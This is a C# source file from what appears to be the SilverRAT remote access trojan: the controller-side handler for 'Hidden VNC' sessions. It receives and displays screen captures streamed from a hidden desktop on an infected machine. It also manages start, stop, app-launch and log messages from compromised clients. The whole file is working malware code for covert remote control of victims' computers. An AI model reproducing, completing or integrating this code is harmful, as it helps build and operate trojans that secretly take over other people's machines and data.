using Bunifu.UI.WinForms;
using SilverRAT.Connection;
using SilverRAT.Forms;
using SilverRAT.Helper;
using SilverRAT.MessagePack;
using SilverRAT.StreamLibrary.UnsafeCodecs;
using System;
using System.Diagnostics;
using System.Drawing;
using System.IO;
using System.Windows.Forms;

namespace SilverRAT.Handle_Packet;

internal class HandleHiddenVNC
{
    public void Connect(Clients client, MsgPack unpack_msgpack)
    {
        try
        {
            switch (unpack_msgpack.ForcePathObject("Command").AsString)
            {
                case "Logs":
                    {
                        HiddenVNC hiddenVNC6 = (HiddenVNC)Application.OpenForms["HVNC:" + unpack_msgpack.ForcePathObject("ID").AsString];
                        try
                        {
                            if (hiddenVNC6 != null)
                            {
                                if (bool.Parse(unpack_msgpack.ForcePathObject("State").AsString))
                                {
                                    hiddenVNC6.Logs.ForeColor = Color.Black;
                                }
                                else
                                {
                                    hiddenVNC6.Logs.ForeColor = Color.Red;
                                }
                                hiddenVNC6.Logs.Text = unpack_msgpack.ForcePathObject("Message").AsString;
                            }
                            else
                            {
                                client.Disconnected();
                            }
                            break;
                        }
                        catch
                        {
                            break;
                        }
                    }
                case "RunApps":
                    {
                        HiddenVNC hiddenVNC3 = (HiddenVNC)Application.OpenForms["HVNC:" + unpack_msgpack.ForcePathObject("ID").AsString];
                        try
                        {
                            if (hiddenVNC3 != null)
                            {
                                hiddenVNC3.RunApps.Enabled = true;
                                hiddenVNC3.ListApps.Enabled = true;
                            }
                            else
                            {
                                client.Disconnected();
                            }
                            break;
                        }
                        catch
                        {
                            break;
                        }
                    }
                case "Capture":
                    {
                        HiddenVNC hiddenVNC2 = (HiddenVNC)Application.OpenForms["HVNC:" + unpack_msgpack.ForcePathObject("ID").AsString];
                        if (hiddenVNC2 != null)
                        {
                            byte[] asBytes = unpack_msgpack.ForcePathObject("Stream").GetAsBytes();
                            lock (hiddenVNC2.syncPicbox)
                            {
                                using (MemoryStream inStream = new MemoryStream(asBytes))
                                {
                                    Bitmap bitmap = (Bitmap)(hiddenVNC2.GetImage = hiddenVNC2.decoder.DecodeData(inStream));
                                    hiddenVNC2.rdSize = bitmap.Size;
                                }
                                hiddenVNC2.ViewerBox.Image = hiddenVNC2.GetImage;
                                hiddenVNC2.FPS++;
                                if (hiddenVNC2.sw.ElapsedMilliseconds >= 1000L)
                                {
                                    BunifuLabel fPSinfo = hiddenVNC2.FPSinfo;
                                    int fPS = hiddenVNC2.FPS;
                                    fPSinfo.Text = "FPS: " + fPS + " | Size: " + Methods.BytesToString(asBytes.Length);
                                    hiddenVNC2.FPS = 0;
                                    hiddenVNC2.sw = Stopwatch.StartNew();
                                }
                                break;
                            }
                        }
                        client.Disconnected();
                        break;
                    }
                case "Stop":
                    {
                        HiddenVNC hiddenVNC4 = (HiddenVNC)Application.OpenForms["HVNC:" + unpack_msgpack.ForcePathObject("ID").AsString];
                        if (hiddenVNC4 != null)
                        {
                            hiddenVNC4.Power.Enabled = true;
                            hiddenVNC4.Power.Text = "Start";
                            hiddenVNC4.FPSinfo.Text = "";
                            hiddenVNC4.WaitRDP.Visible = true;
                            try
                            {
                                if (hiddenVNC4.decoder != null)
                                {
                                    hiddenVNC4.decoder = new UnsafeStreamCodec(hiddenVNC4.QualityTrackBar.Value);
                                }
                                if (hiddenVNC4.ViewerBox.Image != null)
                                {
                                    hiddenVNC4.ViewerBox.Image = null;
                                }
                                break;
                            }
                            catch (Exception ex)
                            {
                                MessageBox.Show(ex.ToString());
                                break;
                            }
                        }
                        client.Disconnected();
                        break;
                    }
                case "Start":
                    {
                        HiddenVNC hiddenVNC5 = (HiddenVNC)Application.OpenForms["HVNC:" + unpack_msgpack.ForcePathObject("ID").AsString];
                        if (hiddenVNC5 != null)
                        {
                            hiddenVNC5.WaitRDP.Visible = false;
                            hiddenVNC5.Power.Enabled = true;
                            hiddenVNC5.Power.Text = "Stop";
                        }
                        else
                        {
                            client.Disconnected();
                        }
                        break;
                    }
                case "Actived":
                    {
                        HiddenVNC hiddenVNC = (HiddenVNC)Application.OpenForms["HVNC:" + unpack_msgpack.ForcePathObject("ID").AsString];
                        if (hiddenVNC != null)
                        {
                            if (hiddenVNC.Client == null)
                            {
                                hiddenVNC.Client = client;
                                hiddenVNC.LoaderConnect.Visible = false;
                                hiddenVNC.Timer1.Start();
                                hiddenVNC.Power.Enabled = true;
                            }
                        }
                        else
                        {
                            client.Disconnected();
                        }
                        break;
                    }
            }
        }
        catch
        {
        }
    }
}
